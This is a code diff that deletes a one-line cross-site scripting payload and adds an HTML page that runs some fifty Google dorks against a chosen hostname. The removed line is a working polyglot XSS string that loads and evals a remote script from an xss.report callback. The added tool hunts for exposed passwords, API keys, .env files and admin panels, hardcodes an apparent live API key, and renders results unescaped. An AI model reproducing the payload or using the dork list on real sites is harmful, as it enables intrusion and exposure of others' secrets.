@@ -1,1 +1,133 @@
-'><script src="https://xss.report/c/stish834"></script>" onerror="eval(atob(this.id))" id="dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTthLnNyYz0iaHR0cHM6Ly94c3MucmVwb3J0L2Mvc3Rpc2g4MzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7">//" autofocus onfocus="import('https://xss.report/c/stish834')" style="background:url('javascript:alert(1)')" 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Dork Search Tool</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+    }
+    #search-results {
+      margin-top: 20px;
+    }
+    .result-item {
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Google Dork Search Tool</h1>
+  <input type="text" id="hostname" placeholder="Enter hostname (e.g., staging.ethos.com)">
+  <button onclick="performSearch()">Search</button>
+
+  <div id="search-results"></div>
+
+  <script>
+    const apiKey = 'AIzaSyCeDda5xlXFcoWktS6pfmpR7djqvvazWIo'; // Your API key
+    const searchEngineId = '6046f988b00954351'; // Your Search Engine ID
+
+    // List of dorks to apply
+    const dorks = [
+      'ext:log | ext:txt | ext:bak | ext:env',
+      'intext:"password" | intext:"secret" | intext:"api_key"',
+      'inurl:admin | inurl:dashboard | inurl:config',
+      'filetype:json | filetype:xml | filetype:conf',
+      'intitle:"index of" | intitle:"config"',
+      '"confidential" | "internal use only"',
+      '"AWS_SECRET_ACCESS_KEY" | "PRIVATE_KEY"',
+      '"s3.amazonaws.com" | "public bucket"',
+      'intext:"authentication token" | intext:"Authorization: Bearer"',
+      'intext:"credentials" | intext:"database password"',
+      'ext:sql | ext:db | ext:sqlite',
+      'inurl:admin | inurl:dashboard | inurl:login',
+      'inurl:portal | inurl:controlpanel',
+      'inurl:manage | inurl:cms',
+      'inurl:administrator | inurl:sysadmin',
+      'inurl:staff | inurl:internal',
+      'inurl:login | inurl:signin',
+      'inurl:backend | inurl:auth',
+      'inurl:secure | inurl:auth',
+      'inurl:privileged',
+      'filetype:js intext:"localStorage"',
+      'filetype:js intext:"fetch("',
+      'filetype:js intext:"XMLHttpRequest"',
+      'filetype:js intext:"innerHTML"',
+      'filetype:js intext:"sessionStorage"',
+      'filetype:js intext:"authorization"',
+      'filetype:js intext:"Bearer "',
+      'filetype:js intext:"token"',
+      'filetype:js intext:"password"',
+      'filetype:js intext:"apiKey"',
+      'filetype:js intext:"document.cookie"',
+      'intext:"error in application"',
+      'intext:"unexpected token"',
+      'intext:"exception" | intext:"traceback"',
+      'intext:"failed to load"',
+      'intext:"server error"',
+      'intext:"NullPointerException"',
+      'intext:"not found" | intext:"does not exist"',
+      'intext:"internal server error"',
+      'intext:"invalid request"',
+      'intext:"syntax error"',
+      'intext:"stack trace"',
+      'inurl:"/api/" | inurl:"/graphql/"',
+      'inurl:"/v1/" | inurl:"/v2/"',
+      'inurl:"/internal/api/"',
+      'inurl:"/public-api/"',
+      'inurl:"/dev-api/"',
+      'inurl:"/api-docs/"',
+      'inurl:"swagger.json"',
+      'inurl:"openapi.json"',
+      'inurl:"/rest/"',
+      'inurl:"/test-api/"',
+      'inurl:"/debug-api/"'
+    ];
+
+    async function performSearch() {
+      const hostname = document.getElementById('hostname').value;
+      const resultsContainer = document.getElementById('search-results');
+      resultsContainer.innerHTML = '<p>Searching...</p>';
+
+      let allResults = [];
+
+      for (const dork of dorks) {
+        const query = `site:${hostname} ${dork}`;
+        const url = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(query)}&key=${apiKey}&cx=${searchEngineId}`;
+
+        try {
+          const response = await fetch(url);
+          const data = await response.json();
+          if (data.items) {
+            allResults = allResults.concat(data.items);
+          }
+        } catch (error) {
+          console.error(`Error fetching results for dork: ${dork}`, error);
+        }
+      }
+
+      displayResults(allResults);
+    }
+
+    function displayResults(results) {
+      const resultsContainer = document.getElementById('search-results');
+      resultsContainer.innerHTML = '';
+
+      if (results.length > 0) {
+        results.forEach(result => {
+          const resultItem = document.createElement('div');
+          resultItem.className = 'result-item';
+          resultItem.innerHTML = `
+            <a href="${result.link}" target="_blank">${result.title}</a>
+            <p>${result.snippet}</p>
+          `;
+          resultsContainer.appendChild(resultItem);
+        });
+      } else {
+        resultsContainer.innerHTML = '<p>No results found.</p>';
+      }
+    }
+  </script>
+</body>
+</html>
